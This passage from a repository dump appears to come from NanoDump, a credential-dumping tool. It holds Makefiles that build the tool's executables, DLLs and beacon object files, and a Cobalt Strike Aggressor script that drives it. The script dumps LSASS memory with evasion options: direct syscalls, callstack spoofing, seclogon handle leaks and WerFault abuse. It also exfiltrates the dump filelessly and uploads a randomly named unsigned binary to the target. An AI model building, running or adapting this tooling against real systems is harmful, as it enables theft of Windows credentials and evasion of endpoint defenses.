dist/$(BOFNAME)_ppl_dump.x64.exe $(OPTIONS) -DEXE -DPPL_DUMP -DDEBUG\n\n\t$(CC_x86) source/utils.c source/syscalls.c source/dinvoke.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_dump.c -o dist/$(BOFNAME)_ppl_dump.x86.exe $(OPTIONS) -DEXE -DPPL_DUMP -DDEBUG\n\n\t$(CC_x64) -c source/ppl/ppl.c -o dist/$(BOFNAME)_ppl_dump.x64.o $(OPTIONS) -DBOF -DPPL_DUMP -DDEBUG\n\n\t$(CC_x64) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/ppl/ppl_medic_dll.c source/pipe.c source/entry.c -o dist/$(BOFNAME)_ppl_medic.x64.dll $(OPTIONS) $(PPL_MEDIC_OPTIONS) -DNANO -DPPL_MEDIC -DDDL -shared -DDEBUG\n\t./dist/bin2c dist/$(BOFNAME)_ppl_medic.x64.dll $(BOFNAME)_ppl_medic_dll > include/$(BOFNAME)_ppl_medic_dll.x64.h\n\n\t$(CC_x64) source/utils.c source/syscalls.c source/dinvoke.c source/handle.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_medic.c source/pipe.c source/ppl/ppl_medic_client.c -o dist/$(BOFNAME)_ppl_medic.x64.exe $(OPTIONS) $(PPL_MEDIC_OPTIONS) -DEXE -DPPL_MEDIC -DNANO -DDEBUG\n\n\t$(CC_x64) -c source/ppl/ppl.c -o dist/$(BOFNAME)_ppl_medic.x64.o $(OPTIONS) $(PPL_MEDIC_OPTIONS) -DBOF -DPPL_MEDIC -DDEBUG\n\n\t$(GCC) source/restore_signature.c -o scripts/restore_signature -static -s -Os\n\nclean:\n\trm -f dist/*\n"
        },
        {
          "name": "Makefile.msvc",
          "type": "blob",
          "size": 10.0615234375,
          "content": "\nOPTIONS = -Zp8 -c -nologo -Gy -GR- -EHa -Oi -GS- -I include\nLIBS = libvcruntime.lib libcmt.lib ucrt.lib kernel32.lib\nPPL_MEDIC_OPTIONS = -DPASS_PARAMS_VIA_NAMED_PIPES=1\nSSP_OPTIONS = -DPASS_PARAMS_VIA_NAMED_PIPES=1\n\nnanodump:\n\t@echo ###### RELEASE ######\n\tML64 /c source/syscalls-asm.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64\n\tML64 /c source/hw_breakpoint-asm.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64\n\tML64 /c source/spoof_callstack-asm.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64\n\n\tcl.exe -DNANO -DEXE $(OPTIONS) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/dinvoke.c source/utils.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/werfault.c source/entry.c\n\tlink.exe /OUT:dist\\nanodump.x64.exe -nologo $(LIBS) /MACHINE:X64 -subsystem:console -nodefaultlib entry.obj nanodump.obj utils.obj spoof_callstack.obj hw_breakpoint.obj hw_breakpoint-asm.obj spoof_callstack-asm.obj shtinkering.obj dinvoke.obj token_priv.obj handle.obj impersonate.obj malseclogon.obj werfault.obj modules.obj syscalls-asm.obj syscalls.obj\n\n#\tcl.exe -DNANO -DBOF /Fo:dist\\nanodump.x64.o $(OPTIONS) source/entry.c\n\n\tcl.exe source/bin2c.c /Fe:dist\\bin2c.exe\n\n\tcl.exe -DNANO -DSSP -DDDL $(OPTIONS) $(SSP_OPTIONS) source/utils.c source/handle.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/dinvoke.c source/pipe.c source/entry.c\n\tlink.exe -DLL /OUT:dist\\nanodump_ssp.x64.dll -nologo $(LIBS) /MACHINE:X64 -subsystem:console -nodefaultlib entry.obj pipe.obj dinvoke.obj nanodump.obj token_priv.obj handle.obj utils.obj modules.obj syscalls-asm.obj syscalls.obj\n\t.\\dist\\bin2c.exe dist\\nanodump_ssp.x64.dll nanodump_ssp_dll > include\\nanodump_ssp_dll.x64.h\n\n#\tcl.exe -DBOF -DSSP /Fo:dist\\nanodump_ssp.x64.o $(OPTIONS) $(SSP_OPTIONS) source/ssp/ssp.c\n\n\tcl.exe -DEXE -DSSP $(OPTIONS) $(SSP_OPTIONS) source/utils.c source/syscalls.c source/dinvoke.c source/pipe.c source/ssp/ssp_utils.c source/ssp/ssp.c\n\tlink.exe /OUT:dist\\nanodump_ssp.x64.exe -nologo $(LIBS) /MACHINE:X64 -subsystem:console -nodefaultlib utils.obj dinvoke.obj pipe.obj ssp_utils.obj ssp.obj syscalls-asm.obj syscalls.obj\n\n\tcl.exe -DNANO -DPPL_DUMP -DDLL $(OPTIONS) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/entry.c\n\tlink.exe -DLL /OUT:dist\\nanodump_ppl_dump.x64.dll -nologo $(LIBS) /MACHINE:X64 -subsystem:console -nodefaultlib entry.obj nanodump.obj utils.obj modules.obj syscalls-asm.obj syscalls.obj spoof_callstack.obj hw_breakpoint.obj hw_breakpoint-asm.obj spoof_callstack-asm.obj shtinkering.obj output.obj cleanup.obj dinvoke.obj handle.obj impersonate.obj token_priv.obj\n\t.\\dist\\bin2c.exe dist\\nanodump_ppl_dump.x64.dll nanodump_ppl_dump_dll > include\\nanodump_ppl_dump_dll.x64.h\n\n\tcl.exe -DEXE -DPPL_DUMP $(OPTIONS) source/utils.c source/syscalls.c source/dinvoke.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_dump.c\n\tlink.exe /OUT:dist\\nanodump_ppl_dump.x64.exe utils.obj syscalls-asm.obj syscalls.obj dinvoke.obj token_priv.obj ppl_utils.obj impersonate.obj ppl.obj ppl_dump.obj\n\n#\tcl.exe -DBOF -DPPL_DUMP /Fo:dist\\nanodump_ppl_dump.x64.o $(OPTIONS) source/ppl/ppl.c\n\n\tcl.exe -DNANO -DPPL_MEDIC -DDDL $(OPTIONS) $(PPL_MEDIC_OPTIONS) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/ppl/ppl_medic_dll.c source/pipe.c source/entry.c\n\tlink.exe -DLL /OUT:dist\\nanodump_ppl_medic.x64.dll -nologo $(LIBS) /MACHINE:X64 -subsystem:console -nodefaultlib spoof_callstack.obj hw_breakpoint.obj hw_breakpoint-asm.obj spoof_callstack-asm.obj shtinkering.obj output.obj cleanup.obj utils.obj dinvoke.obj handle.obj impersonate.obj modules.obj syscalls-asm.obj syscalls.obj token_priv.obj nanodump.obj ppl_medic_dll.obj pipe.obj entry.obj\n\t.\\dist\\bin2c.exe dist\\nanodump_ppl_medic.x64.dll nanodump_ppl_medic_dll > include\\nanodump_ppl_medic_dll.x64.h\n\n\tcl.exe -DEXE -DPPL_MEDIC -DNANO $(OPTIONS) $(PPL_MEDIC_OPTIONS) source/utils.c source/syscalls.c source/dinvoke.c source/handle.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_medic.c source/pipe.c source/ppl/ppl_medic_client.c\n\tlink.exe /OUT:dist\\nanodump_ppl_medic.x64.exe utils.obj syscalls-asm.obj syscalls.obj dinvoke.obj handle.obj token_priv.obj ppl_utils.obj impersonate.obj ppl.obj ppl_medic.obj pipe.obj ppl_medic_client.obj\n\n#\tcl.exe -DBOF -DPPL_MEDIC /Fo:dist\\nanodump_ppl_medic.x64.o $(OPTIONS) source/ppl/ppl.c\n\n\tcl.exe source/restore_signature.c /Fe:scripts\\restore_signature.exe\n\ndebug:\n\t@echo ###### DEBUG ######\n\tML64 /c source/syscalls-asm.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64\n\tML64 /c source/hw_breakpoint-asm.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64\n\tML64 /c source/spoof_callstack-asm.asm /link /NODEFAULTLIB /RELEASE /MACHINE:X64\n\n\tcl.exe -DNANO -DEXE -DDEBUG $(OPTIONS) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/dinvoke.c source/utils.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/malseclogon.c source/nanodump.c source/werfault.c source/entry.c\n\tlink.exe /OUT:dist\\nanodump.x64.exe -nologo $(LIBS) /MACHINE:X64 -subsystem:console -nodefaultlib entry.obj nanodump.obj utils.obj spoof_callstack.obj hw_breakpoint.obj hw_breakpoint-asm.obj spoof_callstack-asm.obj shtinkering.obj dinvoke.obj token_priv.obj handle.obj impersonate.obj malseclogon.obj werfault.obj modules.obj syscalls-asm.obj syscalls.obj\n\n#\tcl.exe -DNANO -DBOF -DDEBUG /Fo:dist\\nanodump.x64.o $(OPTIONS) source/entry.c\n\n\tcl.exe source/bin2c.c /Fe:dist\\bin2c.exe\n\n\tcl.exe -DNANO -DSSP -DDDL -DDEBUG $(OPTIONS) $(SSP_OPTIONS) source/utils.c source/handle.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/dinvoke.c source/pipe.c source/entry.c\n\tlink.exe -DLL /OUT:dist\\nanodump_ssp.x64.dll -nologo $(LIBS) /MACHINE:X64 -subsystem:console -nodefaultlib entry.obj pipe.obj dinvoke.obj nanodump.obj token_priv.obj handle.obj utils.obj modules.obj syscalls-asm.obj syscalls.obj\n\t.\\dist\\bin2c.exe dist\\nanodump_ssp.x64.dll nanodump_ssp_dll > include\\nanodump_ssp_dll.x64.h\n\n#\tcl.exe -DBOF -DSSP -DDEBUG /Fo:dist\\nanodump_ssp.x64.o $(OPTIONS) $(SSP_OPTIONS) source/ssp/ssp.c\n\n\tcl.exe -DEXE -DSSP -DDEBUG $(OPTIONS) $(SSP_OPTIONS) source/utils.c source/syscalls.c source/dinvoke.c source/pipe.c source/ssp/ssp_utils.c source/ssp/ssp.c\n\tlink.exe /OUT:dist\\nanodump_ssp.x64.exe -nologo $(LIBS) /MACHINE:X64 -subsystem:console -nodefaultlib utils.obj dinvoke.obj pipe.obj ssp_utils.obj ssp.obj syscalls-asm.obj syscalls.obj\n\n\tcl.exe -DNANO -DPPL_DUMP -DDLL -DDEBUG $(OPTIONS) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/entry.c\n\tlink.exe -DLL /OUT:dist\\nanodump_ppl_dump.x64.dll -nologo $(LIBS) /MACHINE:X64 -subsystem:console -nodefaultlib entry.obj nanodump.obj utils.obj modules.obj syscalls-asm.obj syscalls.obj spoof_callstack.obj hw_breakpoint.obj hw_breakpoint-asm.obj spoof_callstack-asm.obj shtinkering.obj output.obj cleanup.obj dinvoke.obj handle.obj impersonate.obj token_priv.obj\n\t.\\dist\\bin2c.exe dist\\nanodump_ppl_dump.x64.dll nanodump_ppl_dump_dll > include\\nanodump_ppl_dump_dll.x64.h\n\n\tcl.exe -DEXE -DPPL_DUMP -DDEBUG $(OPTIONS) source/utils.c source/syscalls.c source/dinvoke.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_dump.c\n\tlink.exe /OUT:dist\\nanodump_ppl_dump.x64.exe utils.obj syscalls-asm.obj syscalls.obj dinvoke.obj token_priv.obj ppl_utils.obj impersonate.obj ppl.obj ppl_dump.obj\n\n#\tcl.exe -DBOF -DPPL_DUMP -DDEBUG /Fo:dist\\nanodump_ppl_dump.x64.o $(OPTIONS) source/ppl/ppl.c\n\n\tcl.exe -DNANO -DPPL_MEDIC -DDDL -DDEBUG $(OPTIONS) $(PPL_MEDIC_OPTIONS) source/spoof_callstack.c source/hw_breakpoint.c source/shtinkering.c source/output.c source/ppl/cleanup.c source/utils.c source/dinvoke.c source/handle.c source/impersonate.c source/modules.c source/syscalls.c source/token_priv.c source/nanodump.c source/ppl/ppl_medic_dll.c source/pipe.c source/entry.c\n\tlink.exe -DLL /OUT:dist\\nanodump_ppl_medic.x64.dll -nologo $(LIBS) /MACHINE:X64 -subsystem:console -nodefaultlib spoof_callstack.obj hw_breakpoint.obj hw_breakpoint-asm.obj spoof_callstack-asm.obj shtinkering.obj output.obj cleanup.obj utils.obj dinvoke.obj handle.obj impersonate.obj modules.obj syscalls-asm.obj syscalls.obj token_priv.obj nanodump.obj ppl_medic_dll.obj pipe.obj entry.obj\n\t.\\dist\\bin2c.exe dist\\nanodump_ppl_medic.x64.dll nanodump_ppl_medic_dll > include\\nanodump_ppl_medic_dll.x64.h\n\n\tcl.exe -DEXE -DPPL_MEDIC -DNANO -DDEBUG $(OPTIONS) $(PPL_MEDIC_OPTIONS) source/utils.c source/syscalls.c source/dinvoke.c source/handle.c source/token_priv.c source/ppl/ppl_utils.c source/impersonate.c source/ppl/ppl.c source/ppl/ppl_medic.c source/pipe.c source/ppl/ppl_medic_client.c\n\tlink.exe /OUT:dist\\nanodump_ppl_medic.x64.exe utils.obj syscalls-asm.obj syscalls.obj dinvoke.obj handle.obj token_priv.obj ppl_utils.obj impersonate.obj ppl.obj ppl_medic.obj pipe.obj ppl_medic_client.obj\n\n#\tcl.exe -DBOF -DPPL_MEDIC -DDEBUG /Fo:dist\\nanodump_ppl_medic.x64.o $(OPTIONS) source/ppl/ppl.c\n\n\tcl.exe source/restore_signature.c /Fe:scripts\\restore_signature.exe\n\nclean:\n\t@del /Q token_priv.obj spoof_callstack.obj hw_breakpoint.obj hw_breakpoint-asm.obj spoof_callstack-asm.obj shtinkering.obj dinvoke.obj entry.obj handle.obj impersonate.obj load_ssp.obj malseclogon.obj werfault.obj modules.obj nanodump.obj syscalls-asm.obj syscalls.obj utils.obj dist\\load_ssp.x64.exe dist\\load_ssp.x64.o dist\\nanodump.x64.exe dist\\nanodump.x64.o dist\\nanodump_ssp.x64.dll dist\\nanodump_ssp.x64.exp dist\\nanodump_ssp.x64.lib dist\\nanodump_ppl.x64.lib dist\\nanodump_ppl.x64.dll\n"
        },
        {
          "name": "NanoDump.cna",
          "type": "blob",
          "size": 27.697265625,
          "content": "\nsub generate_rand_string {\nlocal('@dictionary $string $min_length $max_length $length');\n    @dictionary = @(\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"A\", \"B\", \"C\", \"D\", \"E\", \"F\", \"G\", \"H\", \"I\", \"J\", \"K\", \"L\", \"M\", \"N\", \"O\", \"P\", \"Q\", \"R\", \"S\", \"T\", \"U\", \"V\", \"W\", \"X\", \"Y\", \"Z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\");\n    $min_length = $1;\n    $max_length = $2;\n    $length =  $min_length + rand($max_length - $min_length);\n    $string = \"\";\n    while ($length != 0)\n    {\n        $string = $string . rand(@dictionary);\n        $length--;\n    }\n    return $string;\n}\n\nsub is_full_path {\nlocal('$string $c');\n    $string = lc($1);\n    $c = byteAt($string, 0);\n    # 97 -> a, 122 -> z\n    if ($c < 97 || $c > 122)\n    {\n        return false;\n    }\n    $c = byteAt($string, 1);\n    # 58 -> :\n    if ($c != 58)\n    {\n        return false;\n    }\n    $c = byteAt($string, 2);\n    # 92 -> \\\n    if ($c != 92)\n    {\n        return false;\n    }\n    return true;\n}\n\nbeacon_command_register(\n\"nanodump\",\n\"Use syscalls to dump LSASS.\",\n\"usage: nanodump [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]\\\nDumpfile options:\\\n    --write DUMP_PATH, -w DUMP_PATH\\\n            filename of the dump\\\n    --valid, -v\\\n            create a dump with a valid signature\\\nObtain an LSASS handle via:\\\n    --duplicate, -d\\\n            duplicate a high privileged existing LSASS handle\\\n    --duplicate-elevate, -de\\\n            duplicate a low privileged existing LSASS handle and then elevate it\\\n    --seclogon-leak-local, -sll\\\n            leak an LSASS handle into nanodump via seclogon\\\n    --seclogon-leak-remote BIN_PATH, -slt BIN_PATH\\\n            leak an LSASS handle into another process via seclogon and duplicate it\\\n    --seclogon-duplicate, -sd\\\n            make seclogon open a handle to LSASS and duplicate it\\\n    --spoof-callstack, -sc\\\n            open a handle to LSASS using a fake calling stack\\\nLet WerFault.exe (instead of nanodump) create the dump\\\n    --silent-process-exit DUMP_FOLDER, -spe DUMP_FOLDER\\\n            force WerFault.exe to dump LSASS via SilentProcessExit\\\n    --shtinkering, -sk\\\n            force WerFault.exe to dump LSASS via Shtinkering\\\nAvoid reading LSASS directly:\\\n    --fork, -f\\\n            fork the target process before dumping\\\n    --snapshot, -s\\\n            snapshot the target process before dumping\\\nAvoid opening a handle with high privileges:\\\n    --elevate-handle, -eh\\\n            open a handle to LSASS with low privileges and duplicate it to gain higher privileges\\\nMiscellaneous:\\\n    --getpid\\\n            print the PID of LSASS and leave\\\n    --chunk-size\\\n            chunk size in KiB used to exfiltrate the dump without touching disk (default 900)\\\nHelp:\\\n    --help, -h\\\n            print this help message and leave\");\nalias nanodump {\n    local('$barch $handle $bof $exe $args $pid $cname $dump_path $write_file $use_valid_sig $fork $snapshot $dup $i $get_pid $use_seclogon_leak_local $use_seclogon_leak_remote $folder $nanodump_binary $silent_process_exit $use_silent_process_exit $use_seclogon_duplicate $spoof_callstack $use_lsass_shtinkering $user $elevate_handle');\n\n    $barch = barch($1);\n    if($barch eq \"x86\")\n    {\n        berror($1, \"Nanodump does not support x86\");\n        return;\n    }\n\n    # reading lsass requires elevated privileges\n    if(!-isadmin $1)\n    {\n        berror($1, \"You need to be admin to run nanodump.\");\n        return;\n    }\n\n    # read in the BOF file\n    $handle = openf(script_resource(\"dist/nanodump.\" . $barch . \".o\"));\n    $bof = readb($handle, -1);\n    closef($handle);\n    if(strlen($bof) == 0)\n    {\n        berror($1, \"could not read bof file\");\n        return;\n    }\n\n    # by default, don't use werfault\n    $silent_process_exit = \"\";\n    $use_silent_process_exit = 0;\n    # by default, don't set any decoy binary\n    $seclogon_leak_remote_binary = \"\";\n    # by default, do not use MalSecLogon leak\n    $use_seclogon_leak_local = 0;\n    $use_seclogon_leak_remote = 0;\n    # by default, do not use the MalSecLogon race condition\n    $use_seclogon_duplicate = 0;\n    # by default, do not get the PID of LSASS\n    $get_pid = 0;\n    # by default, nanodump will find the PID of LSASS dinamically\n    $pid = 0;\n    # name of the dump when downloaded fileless\n    $cname = beacon_info($1, \"computer\");\n    $time = int(ticks() / 1000);\n    $dump_path = $cname . \"_\" . $time . \"_lsass.dmp\";\n    # by default, download the minidump fileless\n    $write_file = 0;\n    # by default, do not fork the target process\n    $fork = 0;\n    # by default, do not snapshot the target process\n    $snapshot = 0;\n    # by default, do not duplicate an LSASS handle\n    $dup = 0;\n    # by default, the signature of the minidump is invalid\n    $use_valid_sig = 0;\n    # by default, do not spoof the stack\n    $spoof_callstack = 0;\n    # by default, do not use shtinkering\n    $use_lsass_shtinkering = 0;\n    # by default, dont use handle elevation\n    $elevate_handle = 0;\n    # by default, dont use handle duplication and elevation\n    $duplicate_elevate = 0;\n    # by default, the chunk size is 900 KiB\n    $chunk_size = 0xe1000;\n    for ($i = 1; $i < size(@_); $i++)\n    {\n        if (@_[$i] eq \"--getpid\")\n        {\n            # get the PID of LSASS and leave\n            $get_pid = 1;\n        }\n        else if (@_[$i] eq \"--valid\" || @_[$i] eq \"-v\")\n        {\n            # use a valid signature for the minidump\n            $use_valid_sig = 1;\n        }\n        else if (@_[$i] eq \"--write\" || @_[$i] eq \"-w\")\n        {\n            $i++;\n            if($i >= size(@_))\n            {\n                berror($1, \"missing --write value\");\n                return;\n            }\n            # set the path where the minidump will be written to disk\n            $write_file = 1;\n            $dump_path = @_[$i];\n        }\n        else if (@_[$i] eq \"--pid\" || @_[$i] eq \"-p\")\n        {\n            $i++;\n            if($i >= size(@_))\n            {\n                berror($1, \"missing --pid value\");\n                return;\n            }\n            # set the PID of LSASS\n            $pid = @_[$i];\n            if(!-isnumber $pid || $pid eq \"0\")\n            {\n                berror($1, \"Invalid PID: \" . $pid);\n                return;\n            }\n        }\n        else if (@_[$i] eq \"--fork\" || @_[$i] eq \"-f\")\n        {\n            # set arg to true for process forking\n            $fork = 1;\n        }\n        else if (@_[$i] eq \"--snapshot\" || @_[$i] eq \"-s\")\n        {\n            # set arg to true for process snapshot\n            $snapshot = 1;\n        }\n        else if (@_[$i] eq \"--duplicate\" || @_[$i] eq \"-d\")\n        {\n            # set arg to true for handle duplication\n            $dup = 1;\n        }\n        else if (@_[$i] eq \"--elevate-handle\" || @_[$i] eq \"-eh\")\n        {\n            # set arg to true for elevate handle\n            $elevate_handle = 1;\n        }\n        else if (@_[$i] eq \"--duplicate-elevate\" || @_[$i] eq \"-de\")\n        {\n            # set arg to true for duplicate_elevate handle\n            $duplicate_elevate = 1;\n        }\n        else if (@_[$i] eq \"--seclogon-leak-local\" || @_[$i] eq \"-sll\")\n        {\n            # use MalSecLogon leak local\n            $use_seclogon_leak_local = 1;\n        }\n        else if (@_[$i] eq \"--seclogon-leak-remote\" || @_[$i] eq \"-slr\")\n        {\n            # use MalSecLogon leak remote\n            $use_seclogon_leak_remote = 1;\n            $i++;\n            if($i >= size(@_))\n            {\n                berror($1, \"missing --seclogon-leak-remote value\");\n                return;\n            }\n            # decoy binary path\n            $seclogon_leak_remote_binary = @_[$i];\n            if(!is_full_path($seclogon_leak_remote_binary))\n            {\n                berror($1, \"You must provide a full path: \" . $seclogon_leak_remote_binary);\n                return;\n            }\n        }\n        else if (@_[$i] eq \"--silent-process-exit\" || @_[$i] eq \"-spe\")\n        {\n            $i++;\n            if($i >= size(@_))\n            {\n                berror($1, \"missing --silent-process-exit value\");\n                return;\n            }\n            $use_silent_process_exit = 1;\n            $silent_process_exit = @_[$i];\n        }\n        else if (@_[$i] eq \"--shtinkering\" || @_[$i] eq \"-sk\")\n        {\n            $user = beacon_info($1, \"user\");\n            if ($user ne \"SYSTEM *\")\n            {\n                berror($1, \"You must be SYSTEM to run the Shtinkering technique\");\n                return;\n            }\n            $use_lsass_shtinkering = 1;\n        }\n        else if (@_[$i] eq \"--seclogon-duplicate\" || @_[$i] eq \"-sd\")\n        {\n            # use the seclogon race condition to dup an LSASS handle\n            $use_seclogon_duplicate = 1;\n        }\n        else if (@_[$i] eq \"--spoof-callstack\" || @_[$i] eq \"-sc\")\n        {\n            $spoof_callstack = 1;\n        }\n        else if (@_[$i] eq \"--chunk-size\")\n        {\n            $i++;\n            if($i >= size(@_))\n            {\n                berror($1, \"missing --chunk-size value\");\n                return;\n            }\n            # set the size of the chunk\n            $chunk_size = @_[$i];\n            if(!-isnumber $chunk_size || $chunk_size eq \"0\")\n            {\n                berror($1, \"Invalid chunk size: \" . $chunk_size);\n                return;\n            }\n            # from KiB to bytes\n            $chunk_size = int($chunk_size) * 1024;\n        }\n        else if (@_[$i] eq \"--help\" || @_[$i] eq \"-h\")\n        {\n            berror($1, beacon_command_detail(\"nanodump\"));\n            return;\n        }\n        else\n        {\n            berror($1, \"invalid argument: \" . @_[$i]);\n            return;\n        }\n    }\n\n    if ($get_pid &&\n        ($write_file || $use_valid_sig || $snapshot || $fork || $elevate_handle || $duplicate_elevate ||\n         $use_seclogon_duplicate || $spoof_callstack || $use_seclogon_leak_local ||\n         $use_seclogon_leak_remote || $dup || $use_silent_process_exit || $use_lsass_shtinkering))\n    {\n        berror($1, \"The parameter --getpid is used alone\");\n        return;\n    }\n\n    if ($use_silent_process_exit &&\n        ($write_file || $use_valid_sig || $snapshot || $fork || $elevate_handle || $duplicate_elevate ||\n         $use_seclogon_duplicate || $spoof_callstack || $use_seclogon_leak_local ||\n         $use_seclogon_leak_remote || $dup || $use_lsass_shtinkering))\n    {\n        berror($1, \"The parameter --silent-process-exit is used alone\");\n        return;\n    }\n    if($fork && $snapshot)\n    {\n        berror($1, \"The options --fork and --snapshot cannot be used together\");\n        return;\n    }\n\n    if($dup && $elevate_handle)\n    {\n        berror($1, \"The options --duplicate and --elevate-handle cannot be used together\");\n        return;\n    }\n\n    if($duplicate_elevate && $spoof_callstack)\n    {\n        berror($1, \"The options --duplicate-elevate and --spoof-callstack cannot be used together\");\n        return;\n    }\n\n    if($dup && $spoof_callstack)\n    {\n        berror($1, \"The options --duplicate and --spoof-callstack cannot be used together\");\n        return;\n    }\n\n    if($dup && $use_seclogon_duplicate)\n    {\n        berror($1, \"The options --duplicate and --seclogon-duplicate cannot be used together\");\n        return;\n    }\n\n    if($elevate_handle && $duplicate_elevate)\n    {\n        berror($1, \"The options --elevate-handle and --duplicate-elevate cannot be used together\");\n        return;\n    }\n\n    if($duplicate_elevate && $dup)\n    {\n        berror($1, \"The options --duplicate-elevate and --duplicate cannot be used together\");\n        return;\n    }\n\n    if($duplicate_elevate && $use_seclogon_duplicate)\n    {\n        berror($1, \"The options --duplicate-elevate and --seclogon-duplicate cannot be used together\");\n        return;\n    }\n\n    if($elevate_handle && $use_seclogon_duplicate)\n    {\n        berror($1, \"The options --elevate-handle and --seclogon-duplicate cannot be used together\");\n        return;\n    }\n\n    if($dup && $use_seclogon_leak_local)\n    {\n        berror($1, \"The options --duplicate and --seclogon-leak-local cannot be used together\");\n        return;\n    }\n\n    if($duplicate_elevate && $use_seclogon_leak_local)\n    {\n        berror($1, \"The options --duplicate-elevate and --seclogon-leak-local cannot be used together\");\n        return;\n    }\n\n    if($elevate_handle && $use_seclogon_leak_local)\n    {\n        berror($1, \"The options --elevate-handle and --seclogon-leak-local cannot be used together\");\n        return;\n    }\n\n    if($dup && $use_seclogon_leak_remote)\n    {\n        berror($1, \"The options --duplicate and --seclogon-leak-remote cannot be used together\");\n        return;\n    }\n\n    if($duplicate_elevate && $use_seclogon_leak_remote)\n    {\n        berror($1, \"The options --duplicate-elevate and --seclogon-leak-remote cannot be used together\");\n        return;\n    }\n\n    if($elevate_handle && $use_seclogon_leak_remote)\n    {\n        berror($1, \"The options --elevate-handle and --seclogon-leak-remote cannot be used together\");\n        return;\n    }\n\n    if($use_seclogon_leak_local && $use_seclogon_leak_remote)\n    {\n        berror($1, \"The options --seclogon-leak-local and --seclogon-leak-remote cannot be used together\");\n        return;\n    }\n\n    if($use_seclogon_leak_local && $use_seclogon_duplicate)\n    {\n        berror($1, \"The options --seclogon-leak-local and --seclogon-duplicate cannot be used together\");\n        return;\n    }\n\n    if($use_seclogon_leak_local && $spoof_callstack)\n    {\n        berror($1, \"The options --seclogon-leak-local and --spoof-callstack cannot be used together\");\n        return;\n    }\n\n    if($use_seclogon_leak_remote && $use_seclogon_duplicate)\n    {\n        berror($1, \"The options --seclogon-leak-remote and --seclogon-duplicate cannot be used together\");\n        return;\n    }\n\n    if($use_seclogon_leak_remote && $spoof_callstack)\n    {\n        berror($1, \"The options --seclogon-leak-remote and --spoof-callstack cannot be used together\");\n        return;\n    }\n\n    if($use_seclogon_duplicate && $spoof_callstack)\n    {\n        berror($1, \"The options --seclogon-duplicate and --spoof-callstack cannot be used together\");\n        return;\n    }\n\n    if(!$use_lsass_shtinkering && $use_seclogon_leak_local && !$write_file)\n    {\n        berror($1, \"If --seclogon-leak-local is being used, you need to provide the dump path with --write\");\n        return;\n    }\n\n    if(!$use_lsass_shtinkering && $use_seclogon_leak_local && !is_full_path($dump_path))\n    {\n        berror($1, \"If --seclogon-leak-local is being used, you need to provide the full path: \". $dump_path);\n        return;\n    }\n\n    if ($use_lsass_shtinkering && $fork)\n    {\n        berror($1, \"The options --shtinkering and --fork cannot be used together\");\n        return;\n    }\n\n    if ($use_lsass_shtinkering && $snapshot)\n    {\n        berror($1, \"The options --shtinkering and --snapshot cannot be used together\");\n        return;\n    }\n\n    if ($use_lsass_shtinkering && $use_valid_sig)\n    {\n        berror($1, \"The options --shtinkering and --valid cannot be used together\");\n        return;\n    }\n\n    if ($use_lsass_shtinkering && $write_file)\n    {\n        berror($1, \"The options --shtinkering and --write cannot be used together\");\n        return;\n    }\n\n    if($use_seclogon_leak_local)\n    {\n        $folder = \"C:\\\\Windows\\\\Temp\";\n        $seclogon_leak_remote_binary = $folder . \"\\\\\" .  generate_rand_string(5, 10) . \".exe\";\n        blog($1, \"[!] An unsigned nanodump binary will be uploaded to: \". $seclogon_leak_remote_binary);\n        # read in the EXE file\n        $handle = openf(script_resource(\"dist/nanodump.\" . $barch . \".exe\"));\n        $exe = readb($handle, -1);\n        closef($handle);\n        if(strlen($exe) == 0)\n        {\n            berror($1, \"could not read exe file\");\n            return;\n        }\n        # upload the nanodump binary\n        bupload_raw($1, $seclogon_leak_remote_binary, $exe);\n    }\n\n    # pack the arguments\n    $args = bof_pack($1, \"iziiiiiiiiiiiziiizi\", $pid, $dump_path, $write_file, $chunk_size, $use_valid_sig, $fork, $snapshot, $dup, $elevate_handle, $duplicate_elevate, $get_pid, $use_seclogon_leak_local, $use_seclogon_leak_remote, $seclogon_leak_remote_binary, $use_seclogon_duplicate, $spoof_callstack, $use_silent_process_exit, 